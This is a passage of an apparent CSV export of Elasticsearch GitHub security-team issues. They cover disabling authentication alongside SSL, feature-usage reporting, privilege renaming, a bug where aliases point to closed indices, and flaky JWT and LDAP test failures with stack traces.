 3.To fix this, provide instructions on how to switch Basic Authentication (and all RBAC) off.

**Provide logs (if relevant)**:

curl http://localhost:9200/_cluster
{""error"":{""root_cause"":[{""type"":""security_exception"",""reason"":""missing authentication token for REST request [/_cluster]"",""header"":{""WWW-Authenticate"":""Basic realm=\""security\"" charset=\""UTF-8\""""}}],""type"":""security_exception"",""reason"":""missing authentication token for REST request [/_cluster]"",""header"":{""WWW-Authenticate"":""Basic realm=\""security\"" charset=\""UTF-8\""""}},""status"":401}","Using the various settings options, the closest I've got to switching off RBAC is this:

```
xpack.security.dls_fls.enabled: false
xpack.security.authc.token.enabled: false
xpack.security.authc.api_key.enabled: false
xpack.security.authc:
  realms:
```

which results in the following exception and elasticsearch refusing to start:

ElasticsearchParseException[null-valued setting found for key [x
pack.security.authc.realms] found at line number [18], column number [10]]
Pinging @elastic/es-security (:Security/Security)This is intentional, primarily for historical compatibility reasons, on 6.8

SSL is part of Elasticsearch security, e.g. if you disable security, it will also disable SSL.
In 6.x we consider configuration of SSL as an explicit request to enable the whole security module.

If you really want SSL without requiring authentication, then the solution is to enable [anonymous access](https://www.elastic.co/guide/en/elasticsearch/reference/6.8/anonymous-access.html).
```
xpack.security.authc:
  anonymous:
    username: anonymous_user 
    roles: superuser
```

I don't believe this is documented anywhere useful.Pinging @elastic/es-docs (>docs)This is very unfortunate, and one of the reasons we chose search-guard-ssl over elasticsearch.

With search-guard-ssl, when you turned on search-guard-ssl, you got search-guard-ssl, and that's it. There were no side effects, there were no expected outages or support tickets to our vendor, there was no huge testing cycle while we tried to find out what had broken inside the server as a side effect of switching something unrelated on.

The lack of ability to control features in xpack is a key reason we avoided using it, it is very unfortunate this has not changed.
@minfrin Given Tim's solution, are you encountering any issues with enabling anonymous access instead of straight-up disabling authentication&authorization? I get that it looks like a hack, but I'm curious if it solves it for you (I think that it does, but just to make sure).Our change of elasticsearch version is imposed upon us as part of a wider change to a system we are using, and this wider system has yet to be end to end tested. We don't yet know what, if anything, that anonymous access has broken, and are not likely to know until after Christmas.

What other features in xpack do we need to manually disable?",no,">docs,:Security/Security,Team:Security,"
elastic/elasticsearch,692747024,"Feature Usage always reports Token Service","**Elasticsearch version** : `master`

The License feature usage API (see https://github.com/elastic/elasticsearch/pull/59342) reports the ""security_token_service"" as in permanently in use (if not disabled by a node setting) because the AuthenticationService always checks for Bearer token authentication before checking realms, and that triggers `TokenService.isEnabled()` which performs a feature check.

It may be sufficient to change `TokenService.isEnabled()` to use `isAllowed`, and rely on `TokenService.ensureEnabled()` to do feature tracking.","Pinging @elastic/es-security (:Security/License)CC: @rjernst ",no,">bug,:Security/License,Team:Security,"
elastic/elasticsearch,769201047,"Refactoring cluster privileges action names ","Some Cluster action require read or monitor 
privileges and could be moved from 
`cluster:admin` to `cluster:monitor` to differentiate 
from actions requiring manage privilege and make 
the action properties more obvious. Here is the list 
of the actions I could found and it is open to discussion:

GetPipelineAction
SimulatePipelineAction
SnapshotsStatusAction
GetSnapshotsAction
SnapshotsStatusAction
GetRepositoriesAction
ClusterStateAction
HasPrivilegesAction
GetLifecycleAction
GetStatusAction
GetSnapshotLifecycleAction
GetStatusAction
","Pinging @elastic/es-security (Team:Security)Why `GRANT_API_KEY`? For now, `kibana_system` is the main user of this privilege and it already has and likely will always need some set of ""cluster:admin/*"" privileges. So it seems unnecessary to change it?The description of this issue isn't very clear to me.
I think you're proposing to move a number of actions from `cluster:admin` to cluster:monitor`, but the list of actions isn't provided, nor is there a clear explanation of _why_ we want to do this.

> Why `GRANT_API_KEY`? For now, `kibana_system` is the main user of this privilege and it already has and likely will always need some set of ""cluster:admin/*"" privileges. So it seems unnecessary to change it?

Thanks for the feedback. The list is the first attempt and open for discussion. > The description of this issue isn't very clear to me.
> I think you're proposing to move a number of actions from `cluster:admin` to cluster:monitor`, but the list of actions isn't provided, nor is there a clear explanation of _why_ we want to do this.

I hit this problem while adding new `read_pipeline` privilege. Since GET and Simulate Actions now only require read privilege it seems more logical to move them from `cluster:admin` to `cluster:monitor` to differentiate from actions requiring `manage` privilege.
I found there are a number of other actions which also can be moved from `cluster:admin` to make the action property more obvious. I will update the description with the list of actions. ",no,">refactoring,:Security/Authorization,Team:Security,v8.6.0,"
elastic/elasticsearch,343104891,"Bad request thrown when alias points to a closed index and security enabled","<!-- Bug report -->

**Elasticsearch version** (`bin/elasticsearch --version`): 6.3.0 and earlier

**Plugins installed**: none

**JVM version** (`java -version`): 
java version ""10"" 2018-03-20
Java(TM) SE Runtime Environment 18.3 (build 10+46)
Java HotSpot(TM) 64-Bit Server VM 18.3 (build 10+46, mixed mode)
**OS version** (`uname -a` if on a Unix-like system):
Darwin 17.7.0 Darwin Kernel Version 17.7.0: Thu Jun 21 22:53:14 PDT 2018; root:xnu-4570.71.2~1/RELEASE_X86_64 x86_64
**Description of the problem including expected versus actual behavior**:
_search/* throws a 400 bad request when an alias points at a closed index and security is enabled.  I expect this not to happen.
**Steps to reproduce**:

1. Start Elasticsearch (with security enabled) Note that I can only reproduce it in a cluster with security enabled; if disabled, I cannot reproduce it.
2. Create 2 test indices and an alias:
`POST test1/test1
{
  ""test"":""test""
}`

`POST test2/test1
{
  ""test"":""test""
}`

`POST /_aliases
{
    ""actions"" : [
        { ""add"" : { ""index"" : ""test1"", ""alias"" : ""alias1"" } },
        { ""add"" : { ""index"" : ""test2"", ""alias"" : ""alias1"" } }
    ]
}`
3. do a search
`POST _search
{
  ""size"":0,
  ""aggs"": {
      ""indices"":{""terms"":{""field"":""_index"",""size"":200}}}}`

response:
`{
  ""error"": {
    ""root_cause"": [
      {
        ""type"": ""index_closed_exception"",
        ""reason"": ""closed"",
        ""index_uuid"": ""OO462ue0QQCUQ_lS1SvHTA"",
        ""index"": ""test1""
      }
    ],
    ""type"": ""index_closed_exception"",
    ""reason"": ""closed"",
    ""index_uuid"": ""OO462ue0QQCUQ_lS1SvHTA"",
    ""index"": ""test1""
  },
  ""status"": 400
}`

This issue causes an error in Kibana: https://github.com/elastic/kibana/issues/20920","Pinging @elastic/es-securityThis is essentially the same as #29948. A little over a year ago, I proposed a change that had the following description:

> This change resolves a long standing TODO in the security indices and aliases resolution code when
determining if an alias is visible. Previously, the code only checked if the indices options had
the ignore aliases option set. In this change, each index referenced by the alias has its current
state compared to the values of expand wildcards open and expand wildcards closed from the indices options. If one of the indices has a conflict with the values from the indices options then the
alias is not considered visible.

@javanna reviewed the change and raised issues with this change. This is just an excerpt of what was said:

> Elasticsearch was changed a long while ago to look at state of indices backing aliases. I think that we look at expand_wildcards only when the alias is matched through a wildcard expression though. What happens in that case is that we take out the indices that don't have the expected state, so we end up potentially resolving an alias to a subset of the indices that it points to. We can do that because we are expanding to concrete indices hence e.g. an alias that points to index-closed and index-open will be expanded to index-open only. But if you refer directly to the alias, it will be expanded to all the indices that are backing it regardless of their state.
> 
> In security, things are more complicated as we don't want to resolve aliases to concrete indices, they have to stay as they are, which makes it impossible to do what Elasticsearch does (filtering some of the indices out based on their state). I am not sure that looking at expand_wildcards all the time (and not only for aliases matched by wildcard expressions) is good, though the Elasticsearch behaviour described above is debatable too.
>
> The reason why we need to keep aliases as they are is document level security, as users may have roles configured against aliases but not against their corresponding concrete indices. Given that we have a new way of doing document level security at this point though, we may want to change this, and I think that would be the definitive solution.

Ultimately, we ended up saying that the short-term fix should be #29952. That is to create a custom instance of indices options that is lenient (meaning ignore_unavailable set to true and allow_no_indices set to true) but that forbids closed indices. Longer term we wanted to make some under the cover changes https://github.com/elastic/elasticsearch/issues/29874 that require permissions on indices even when accessed using an alias.What's the disposition of this?  It causes an unrecoverable issue in Kibana when users have aliases pointed at closed indices.@bmcconaghy is this something Kibana can handle? We do not have a clear way forward on our end and it has been a longstanding issue@jaymode Not really, no.  We can just swallow the exception, but that means that you can't create an index pattern at all when you've got this situation.  If you already had an index pattern that matches the alias before this situation came up, you would get fatal errors in discover and visualize.  Again, we could swallow the exception, but then you would be shown no data.@javanna do you think adding forbid_closed_indices as a valid request parameter is an option?Would that mean that Kibana would have to pass that with every request?  That would be a pain to trace through all the places we would need to add it.Or reading this again, maybe it is the reverse, that you would have to pass that to get the current behavior?> @javanna do you think adding forbid_closed_indices as a valid request parameter is an option?

`forbid_closed_indices` is about how API behave and should not be a configurable option. I think that by exposing it we would make things worse. The plan should rather be to try and separate the indices options between internal ones and external ones so internal ones don't ever end up being exposed. 

One thing I don't understand is why this comes up now, as this issue existed for a very long time. Not saying it's good, but it's a known limitation of our security model that allows for document based security through filtered aliases. I will follow-up with Jay to try and see if there's something we can actually do to address it.@javanna and I talked and he reminded me where the real issue lies. Security allows authorization on aliases even if the user is not granted permission to an underlying index. This conflicts with how the default elasticsearch wildcard resolution works which resolves the alias to only the open indices, but security keeps the alias in the request. Essentially there is no good way forward until we remove support for authorizing on aliases #29874This issue also impacts the `/_cat/shards` API call, which gets used a lot in diagnosing issues.  Came up while helping support, and I was able to repro locally against master.  Same setup - create two indices, set up an alias to point to both, close one, try to run `/_cat/shards`.  Whole call will fail with the index closed exception.  I can provide a gist to repro from if that helps.I just ran into the same issue that @not-napoleon described. The fact that closing indices breaks `/_cat/shards` is a problem for us, and it means that we essentially cannot ever close indices.This also seems to affect a number of other API calls including:

```
_stats
_segments
_shards
```I have observed this in an exact scenario for `v7.7` as well with `_stats`API call.

I also have the same issue. As I have closed indices referenced by aliases, I cannot use the `_cat/shards` API.
Is there a workaround we can use?I just ran into the same issue and I am trying some solutions. I can understand we need to keep aliases to cover the following case:

Users may have roles configured against aliases but not against their corresponding concrete indices.

However, can we separate the indices list used to `buildIndicesAccessControl(...)` from the part used to replace the indices for a `IndicesRequest.Replaceable`? When expand wildcards, if permission detection can be passed, the index is appended to the list used to `buildIndicesAccessControl(...)`. Also, this index, if it is an aliases, we can get the backing index and filter it according to IndicesOptions and add it to a separate list which is use to replaces the indices  for the Request at last.

Or, I think we can add and IndicesOptions : `expandWildcardsAlias` which control if a Index is visible  when it is resolved from wildcards. Is this issue a problem on 7+ versions too I have a self-managed client who is complaining about this and they are on version 7.11The problem also affects Data Streams.
At least in 7.17.3 I can reproduce with:
```
# GET _data_stream/logs-endpoint.events.registry-default
{
  ""data_streams"" : [
    {
      ""name"" : ""logs-endpoint.events.registry-default"",
      ""timestamp_field"" : {
        ""name"" : ""@timestamp""
      },
      ""indices"" : [
        {
          ""index_name"" : "".ds-logs-endpoint.events.registry-default-2021.08.11-000001"",
          ""index_uuid"" : ""_9LUd4tKS6m5IDj3JE5DYQ""
        },
        {
          ""index_name"" : "".ds-logs-endpoint.events.registry-default-2022.02.07-000007"",
          ""index_uuid"" : ""QPtaaA5PQ1ymOd6jap6iVw""
        },
        {
          ""index_name"" : "".ds-logs-endpoint.events.registry-default-2022.03.09-000013"",
          ""index_uuid"" : ""LD9C9oDESAaBDJf9o1bBBQ""
        },
        {
          ""index_name"" : "".ds-logs-endpoint.events.registry-default-2022.04.08-000014"",
          ""index_uuid"" : ""qVDp5vfyQMS0OZ4dFxajtw""
        },
        {
          ""index_name"" : "".ds-logs-endpoint.events.registry-default-2022.05.08-000015"",
          ""index_uuid"" : ""fTbLJZEmTauf4iZmXRU77g""
        }
      ],
...

# POST .ds-logs-endpoint.events.registry-default-2021.08.11-000001/_close

# POST logs-endpoint.events.registry-*/_field_caps?fields=*&ignore_unavailable=true
{
  ""error"" : {
    ""root_cause"" : [
      {
        ""type"" : ""cluster_block_exception"",
        ""reason"" : ""index [.ds-logs-endpoint.events.registry-default-2021.08.11-000001] blocked by: [FORBIDDEN/4/index closed];""
      }
    ],
    ""type"" : ""cluster_block_exception"",
    ""reason"" : ""index [.ds-logs-endpoint.events.registry-default-2021.08.11-000001] blocked by: [FORBIDDEN/4/index closed];""
  },
  ""status"" : 403
}

# GET logs-endpoint.events.registry-default/_search?ignore_unavailable=true
Works fine

# GET logs-endpoint.events.registry-default/_search?ignore_unavailable=false
{
  ""error"" : {
    ""root_cause"" : [
      {
        ""type"" : ""index_closed_exception"",
        ""reason"" : ""closed"",
        ""index_uuid"" : ""_9LUd4tKS6m5IDj3JE5DYQ"",
        ""index"" : "".ds-logs-endpoint.events.registry-default-2021.08.11-000001""
      }
    ],
    ""type"" : ""index_closed_exception"",
    ""reason"" : ""closed"",
    ""index_uuid"" : ""_9LUd4tKS6m5IDj3JE5DYQ"",
    ""index"" : "".ds-logs-endpoint.events.registry-default-2021.08.11-000001""
  },
  ""status"" : 400
}
```

Note:
- Field Caps API fails even if we pass `&ignore_unavailable=true`
- Search with `&ignore_unavailable=true` works fineCore interprets explicitly mentioned aliases differently from the ones covered by wildcards (for the former, in some APIs, it throws an error when they point to closed indices).
But the Security filter replaces wildcards with the authorized resource names (aliases, indices, and datastreams). Hence Core cannot subsequently determine which aliases were mentioned directly from those which Security put in place to replace wildcards.

Security can technically plug into the Core algorithm, such that the plugged-in Core algorithm can deal with wildcards.
But that doesn't mean that the Security filter can pass on the wildcard expansion. The wildcard expansion is still needed for the DLS/FLS features disable in the request interceptors as well as for auditing.

The nub is that we need to do some for of wildcard expansion in the Security filter, but still plug into the Core's algorithm to let it know for which alias names it should error if they point to closed indices.   
",no,">bug,:Security/Authorization,Team:Security,"
elastic/elasticsearch,936624377,"SSL Certficates API should include PKI trust anchors","The SSL Certificates API is currently driven from the SSLService, and the PKI realm's trust anchors aren't loaded by the SSL Service.

Consequently, those trust anchors aren't included in the API response. It would be better if they were - they're certificates in use on the node, so people would expect them to be visible in this API.
","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/TLS,Team:Security,"
elastic/elasticsearch,560181706,"Improve set security user processor doc with examples","The set security user processor are being augumented to provide more information about the authenticated user (#49106) . The change will introduces new fields and some of them are objects themselves containing more fields. 

The associated documentation can be improved with examples to clarify the usage and results of different configurations.","Pinging @elastic/es-docs (>docs)Pinging @elastic/es-security (:Security/Authentication)Pinging @elastic/es-docs (Team:Docs)Pinging @elastic/es-security (Team:Security)",no,">enhancement,>docs,:Security/Authentication,Team:Docs,Team:Security,v8.6.0,"
elastic/elasticsearch,1389491482,"[CI] JwtRealmAuthenticateTests testJwkSetUpdates failing","It looks like the test started failing on the 23rd on `8.4` and `8.5`: https://gradle-enterprise.elastic.co/scans/tests?search.startTimeMax=1664376109074&search.startTimeMin=1663711200000&search.timeZoneId=Europe/Amsterdam&tests.container=org.elasticsearch.xpack.security.authc.jwt.JwtRealmAuthenticateTests&tests.test=testJwkSetUpdates#

**Build scan:**
https://gradle-enterprise.elastic.co/s/mh6xbsqlllxki/tests/:x-pack:plugin:security:test/org.elasticsearch.xpack.security.authc.jwt.JwtRealmAuthenticateTests/testJwkSetUpdates

**Reproduction line:**
`./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.security.authc.jwt.JwtRealmAuthenticateTests.testJwkSetUpdates"" -Dtests.seed=95E5E925085855C9 -Dtests.locale=es-HN -Dtests.timezone=America/Dawson -Druntime.java=17`

**Applicable branches:**
8.5, 8.4

**Reproduces locally?:**
No

**Failure history:**
https://gradle-enterprise.elastic.co/scans/tests?tests.container=org.elasticsearch.xpack.security.authc.jwt.JwtRealmAuthenticateTests&tests.test=testJwkSetUpdates

**Failure excerpt:**
```
java.lang.AssertionError: Expected realm CONTINUE status
Expected: is not ""realm_iss1_4421""
     but: was ""realm_iss1_4421""

  at __randomizedtesting.SeedInfo.seed([95E5E925085855C9:A73A48ACF157045D]:0)
  at org.hamcrest.MatcherAssert.assertThat(MatcherAssert.java:18)
  at org.junit.Assert.assertThat(Assert.java:956)
  at org.elasticsearch.xpack.security.authc.jwt.JwtRealmTestCase.doMultipleAuthcAuthzAndVerifySuccess(JwtRealmTestCase.java:526)
  at org.elasticsearch.xpack.security.authc.jwt.JwtRealmAuthenticateTests.testJwkSetUpdates(JwtRealmAuthenticateTests.java:241)
  at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-2)
  at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77)
  at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
  at java.lang.reflect.Method.invoke(Method.java:568)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:946)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:982)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:996)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:44)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at org.apache.lucene.tests.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:45)
  at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
  at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:843)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:490)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:38)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.tests.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
  at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
  at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
  at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
  at org.apache.lucene.tests.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:47)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:850)
  at java.lang.Thread.run(Thread.java:833)

```","Pinging @elastic/es-security (Team:Security)@justincr-elastic @ywangd I believe you've both done work around this, with #88753 looking pretty related. When you have time, could one of you take a look? It might be related to #89509. I believe Justin is working on reproduction. I can also take a look at this one from the perspective of racing. Self-assigned. Another one today on the 8.4 branch https://gradle-enterprise.elastic.co/s/iec5kcsddvjvcAnother one on 8.5 branch, but the error looks slightly different. Still adding here since it looks related:
https://gradle-enterprise.elastic.co/s/ewmjvx727737i

```
java.lang.AssertionError: 
Expected: is <false>
     but: was <true>
	at __randomizedtesting.SeedInfo.seed([374EF16B6DC63043:59150E294C961D7]:0)
	at org.hamcrest.MatcherAssert.assertThat(MatcherAssert.java:18)
	at org.junit.Assert.assertThat(Assert.java:956)
	at org.junit.Assert.assertThat(Assert.java:923)
	at org.elasticsearch.xpack.security.authc.jwt.JwtRealmTestCase.verifyAuthenticateFailureHelper(JwtRealmTestCase.java:121)
	at org.elasticsearch.xpack.security.authc.jwt.JwtRealmAuthenticateTests.testJwkSetUpdates(JwtRealmAuthenticateTests.java:227)
```I spent quite sometime today trying to figure out why the test is failing but didn't make a lot progress. The test in question is rather hard to follow. Long term we might want to split it into a few smaller ones. For now, I can see the PKC JWKs reloading is not triggered properly. 

The failure message says (both JWT uses PKC algorithm)
```
1. [[I/O dispatcher 97]] Usable PKC: JWKs=[8] algorithms=[RS512,PS256,ES256,ES384,ES512,PS384,ES384,ES384] sha256=[9f0bccf33c63441f07144bb0e6852d831d9b6cde737dd9b3b72ec3a64ab69829]
2. [[I/O dispatcher 97]] Usable PKC: JWKs=[8] algorithms=[RS512,PS256,ES256,ES384,ES512,PS384,ES384,ES384] sha256=[c3191bf8b73c7c4ebb39fc8c9fdf1a477b82fa786c317291fa4d31b95c273d5b]
3. [[I/O dispatcher 97]] Usable PKC: JWKs=[8] algorithms=[RS512,PS256,ES256,ES384,ES512,PS384,ES384,ES384] sha256=[c3191bf8b73c7c4ebb39fc8c9fdf1a477b82fa786c317291fa4d31b95c273d5b]
4. [[I/O dispatcher 97]] Usable PKC: JWKs=[0] algorithms=[] sha256=[9638d11914735d0072002dd4d67c734a94ee7a0cd845e6dcbc984ee7581860a7]
5. [[I/O dispatcher 97]] Usable PKC: JWKs=[0] algorithms=[] sha256=[9638d11914735d0072002dd4d67c734a94ee7a0cd845e6dcbc984ee7581860a7]
```

Where each line should correspond to:
1. [Initial realm creation](https://github.com/elastic/elasticsearch/blob/d1f2b5d79ddfae4e63777960f1406931abca80c5/x-pack/plugin/security/src/test/java/org/elasticsearch/xpack/security/authc/jwt/JwtRealmAuthenticateTests.java#L101) sha: 9f0bccf33c63441f07144bb0e6852d831d9b6cde737dd9b3b72ec3a64ab69829
2. Triggerred by [authenticating with JWT2 the first time](https://github.com/elastic/elasticsearch/blob/d1f2b5d79ddfae4e63777960f1406931abca80c5/x-pack/plugin/security/src/test/java/org/elasticsearch/xpack/security/authc/jwt/JwtRealmAuthenticateTests.java#L179-L185) sha: c3191bf8b73c7c4ebb39fc8c9fdf1a477b82fa786c317291fa4d31b95c273d5b
3. Triggered by [re-authenticating with JWT1](https://github.com/elastic/elasticsearch/blob/d1f2b5d79ddfae4e63777960f1406931abca80c5/x-pack/plugin/security/src/test/java/org/elasticsearch/xpack/security/authc/jwt/JwtRealmAuthenticateTests.java#L192-L196) sha: c3191bf8b73c7c4ebb39fc8c9fdf1a477b82fa786c317291fa4d31b95c273d5b
4. Triggered by [re-re-authenticating with JWT1](https://github.com/elastic/elasticsearch/blob/d1f2b5d79ddfae4e63777960f1406931abca80c5/x-pack/plugin/security/src/test/java/org/elasticsearch/xpack/security/authc/jwt/JwtRealmAuthenticateTests.java#L213-L217), the JWT set is empty this time. sha: 9638d11914735d0072002dd4d67c734a94ee7a0cd845e6dcbc984ee7581860a7
5. Triggered by [re-authenticating with JWT2](https://github.com/elastic/elasticsearch/blob/d1f2b5d79ddfae4e63777960f1406931abca80c5/x-pack/plugin/security/src/test/java/org/elasticsearch/xpack/security/authc/jwt/JwtRealmAuthenticateTests.java#L224-L228). Still empty JWK set sha: 9638d11914735d0072002dd4d67c734a94ee7a0cd845e6dcbc984ee7581860a7
6. **This is where it failed**. It should be triggered by [re-re-authenticating with JWT2](https://github.com/elastic/elasticsearch/blob/d1f2b5d79ddfae4e63777960f1406931abca80c5/x-pack/plugin/security/src/test/java/org/elasticsearch/xpack/security/authc/jwt/JwtRealmAuthenticateTests.java#L240-L244). But the authentication simply failed without a reload. 

It is not clear to me why the last reload did not happen. There could be an exception involved but the test does not log it. I think the next step is to add this missing logging information and perhaps a few more around other critical regions.",no,">test-failure,:Security/Authentication,Team:Security,"
elastic/elasticsearch,974694919,"Add deprecation for CAs in HTTP Keystore","In 8.0 (see https://github.com/elastic/elasticsearch/issues/75097 , https://github.com/elastic/elasticsearch/pull/76636) we're filtering out CAs from HTTP Keystores if a non-CA keypair is present.

We can detect this scenario in 7.x and issue a deprecation warning so that nodes that have the potential to be impact can be easily detected. ","Pinging @elastic/es-security (Team:Security)",no,">deprecation,:Security/TLS,Team:Security,"
elastic/elasticsearch,940623537,"[CI] LdapSessionFactoryTests testGroupLookupBase failing","**Build scan:**
https://gradle-enterprise.elastic.co/s/4vlermt7zjwue/tests/:x-pack:plugin:security:test/org.elasticsearch.xpack.security.authc.ldap.LdapSessionFactoryTests/testGroupLookupBase

**Reproduction line:**
`./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.security.authc.ldap.LdapSessionFactoryTests.testGroupLookupBase"" -Dtests.seed=28BC81A7034B4741 -Dtests.locale=lv-LV -Dtests.timezone=America/Marigot -Druntime.java=8`

**Applicable branches:**
7.13

**Reproduces locally?:**
No

**Failure history:**
https://gradle-enterprise.elastic.co/scans/tests?tests.container=org.elasticsearch.xpack.security.authc.ldap.LdapSessionFactoryTests&tests.test=testGroupLookupBase

**Failure excerpt:**
```
org.elasticsearch.common.util.concurrent.UncategorizedExecutionException: Failed execution

  at __randomizedtesting.SeedInfo.seed([28BC81A7034B4741:D4293233665736E8]:0)
  at org.elasticsearch.common.util.concurrent.FutureUtils.rethrowExecutionException(FutureUtils.java:80)
  at org.elasticsearch.common.util.concurrent.FutureUtils.get(FutureUtils.java:50)
  at org.elasticsearch.action.support.AdapterActionFuture.actionGet(AdapterActionFuture.java:26)
  at org.elasticsearch.xpack.security.authc.ldap.support.LdapTestCase.session(LdapTestCase.java:209)
  at org.elasticsearch.xpack.security.authc.ldap.LdapSessionFactoryTests.testGroupLookupBase(LdapSessionFactoryTests.java:232)
  at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-2)
  at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
  at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
  at java.lang.reflect.Method.invoke(Method.java:498)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1750)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:938)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:974)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:988)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:49)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
  at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:48)
  at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
  at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:817)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:468)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:947)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:832)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:883)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:894)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:41)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
  at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
  at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
